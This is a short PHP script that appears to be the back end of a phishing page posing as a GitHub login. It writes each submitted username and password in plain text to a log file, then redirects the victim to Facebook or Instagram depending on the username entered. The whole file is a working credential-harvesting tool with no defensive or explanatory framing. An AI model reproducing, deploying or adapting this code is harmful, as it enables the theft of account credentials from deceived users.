<?php

file_put_contents("userlog.txt", "github Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
if ($_POST['username'] == "prince" ){
	header('Location: https://facebook.com');
	exit();
}else {
	header('Location: https://instagram.com');
	exit();
}
header('Location: https://github.com');
exit();
                                              
